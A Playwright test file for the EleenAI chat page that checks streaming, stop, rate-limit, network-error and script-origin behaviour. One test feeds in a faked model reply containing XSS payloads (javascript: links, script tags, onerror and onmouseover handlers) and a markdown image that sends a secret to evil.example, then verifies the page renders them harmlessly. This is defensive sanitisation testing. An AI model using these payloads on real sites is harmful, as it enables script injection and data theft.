/**
 * The rebuilt chat page, end to end in a real browser. Every model call is
 * intercepted with a crafted response, so nothing here costs inference.
 */
import { expect, test, type Page } from "@playwright/test";

const v2 = (frames: [string, unknown][]) =>
	frames.map(([event, data]) => `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`).join("");

async function send(page: Page, text: string) {
	const input = page.locator("#user-input");
	await expect(input).toBeEnabled();
	await input.fill(text);
	await page.locator("#send-button").click();
}

test("replays the audit payloads over protocol 2 without executing anything", async ({ page }) => {
	const dialogs: string[] = [];
	page.on("dialog", (d) => {
		dialogs.push(d.message());
		void d.dismiss();
	});
	await page.route("**/api/chat/guest", (route) =>
		route.fulfill({
			headers: { "content-type": "text/event-stream" },
			body: v2([
				["meta", { model: "m", protocol: 2 }],
				["token", { text: '[x](javascript:window.__xss=2) <script>window.__xss=4</script>\n' }],
				["token", { text: '![leak](https://evil.example/?d=secret) <img src=x onerror="window.__xss=1">\n' }],
				["token", { text: '[SUGGEST]<b onmouseover="window.__xss=3">chip</b>[/SUGGEST]' }],
				["done", {}],
			]),
		}),
	);

	await page.goto("/");
	await send(page, "hello");

	const messages = page.locator("#chat-messages");
	await expect(messages.locator(".suggestion-chip")).toHaveText('<b onmouseover="window.__xss=3">chip</b>');
	await page.waitForTimeout(400);

	await expect(messages.locator("img")).toHaveCount(0);
	await expect(messages.locator("script")).toHaveCount(0);
	await expect(messages.locator("[onerror], [onload], [onclick], [onmouseover]")).toHaveCount(0);
	await expect(messages.locator('a[href^="javascript:" i]')).toHaveCount(0);
	// The markdown image became a link, not an <img>.
	await expect(messages.locator('a[href^="https://evil.example"]')).toHaveText("leak");
	expect(await page.evaluate(() => (window as unknown as { __xss?: number }).__xss)).toBeUndefined();
	expect(dialogs).toEqual([]);
});

test("streams a v2 reply, shows usage, and restores Send", async ({ page }) => {
	let sentBody: Record<string, unknown> = {};
	await page.route("**/api/chat/guest", async (route) => {
		sentBody = JSON.parse(route.request().postData() ?? "{}");
		await route.fulfill({
			headers: { "content-type": "text/event-stream" },
			body: v2([
				["meta", { model: "@cf/meta/llama-3.1-8b-instruct-fp8", tier: "fast", protocol: 2 }],
				["token", { text: "## Answer\n\n1. one\n2. two" }],
				["usage", { promptTokens: 10, completionTokens: 37 }],
				["done", {}],
			]),
		});
	});

	await page.goto("/");
	await page.locator('.mode-btn[data-mode="logical"]').click();
	await send(page, "count");

	const reply = page.locator(".assistant-message").last();
	await expect(reply.locator("h3")).toHaveText("Answer");
	await expect(reply.locator("ol li")).toHaveCount(2);
	await expect(reply.locator(".message-usage")).toHaveText("37 tokens");
	await expect(page.locator("#send-button")).toHaveAttribute("title", "Send");

	expect(sentBody.protocol).toBe(2);
	// The classic page never sent the mode; the rebuild does.
	expect(sentBody.mode).toBe("logical");
});

test("Stop aborts a reply in flight and says so", async ({ page }) => {
	let release: () => void = () => {};
	const held = new Promise<void>((resolve) => (release = resolve));
	await page.route("**/api/chat/guest", async (route) => {
		await held;
		await route.fulfill({ headers: { "content-type": "text/event-stream" }, body: v2([["done", {}]]) }).catch(() => {});
	});

	await page.goto("/");
	await send(page, "write a long essay");

	const button = page.locator("#send-button");
	await expect(button).toHaveAttribute("title", "Stop generating");
	await expect(button).toHaveClass(/is-stop/);
	// Past the double-click guard.
	await page.waitForTimeout(600);
	await button.click();

	await expect(page.locator(".assistant-message .message-note").last()).toHaveText("Stopped.");
	await expect(button).toHaveAttribute("title", "Send");
	expect(await page.evaluate(() => window.chat?.isProcessing())).toBe(false);
	release();
});

test("a rate limit gets a designed notice, not a generic error", async ({ page }) => {
	await page.route("**/api/chat/guest", (route) =>
		route.fulfill({
			status: 429,
			headers: { "content-type": "application/json", "retry-after": "1500" },
			body: JSON.stringify({ error: "Rate limit exceeded" }),
		}),
	);
	await page.goto("/");
	await send(page, "hi");
	const notice = page.locator(".assistant-message.is-limit").last();
	await expect(notice).toContainText("You've hit the hourly limit");
	await expect(notice).toContainText("25 min");
});

test("a network failure shows the error state", async ({ page }) => {
	await page.route("**/api/chat/guest", (route) => route.abort("failed"));
	await page.goto("/");
	await send(page, "hi");
	await expect(page.locator(".message-error").last()).toContainText("Could not reach EleenAI");
});

test("with Clerk unreachable the composer still works and dead auth controls hide", async ({ page }) => {
	await page.route("https://clerk.eleenai.xyz/**", (route) => route.abort("failed"));
	await page.goto("/");
	await expect(page.locator("#user-input")).toBeEnabled();
	await expect(page.locator("#send-button")).toBeEnabled();
	// Clerk is given 5 s to appear before the page settles on guest mode.
	await expect(page.locator("#login-button")).toBeHidden({ timeout: 10_000 });
	await expect(page.locator(".toast.error")).toContainText("Sign-in is unavailable");
});

test("loads no third-party script beyond Clerk and the Spline viewer", async ({ page }) => {
	const scripts = new Set<string>();
	page.on("request", (r) => {
		if (r.resourceType() === "script") scripts.add(r.url());
	});
	await page.goto("/");
	await page.waitForLoadState("networkidle").catch(() => {});
	const origin = new URL(page.url()).origin;

	for (const url of scripts) {
		const parsed = new URL(url);
		// The Spline viewer spawns its WebGL workers from blob: URLs it builds
		// itself; worker-src allows blob:. Anything else must be a known host.
		if (parsed.protocol === "blob:") {
			expect(url.startsWith(`blob:${origin}/`), url).toBe(true);
			continue;
		}
		if (parsed.origin === origin) continue;
		expect(parsed.protocol, url).toBe("https:");
		// Clerk's SDK, its bot-protection bootstrap (Clerk Protect), and the
		// pinned Spline viewer. The CSP's script-src must list exactly these.
		expect(["clerk.eleenai.xyz", "cdn.protect.clerk.com", "unpkg.com"], url).toContain(parsed.host);
	}
	expect(await page.locator("script:not([src])").count()).toBe(0);
});
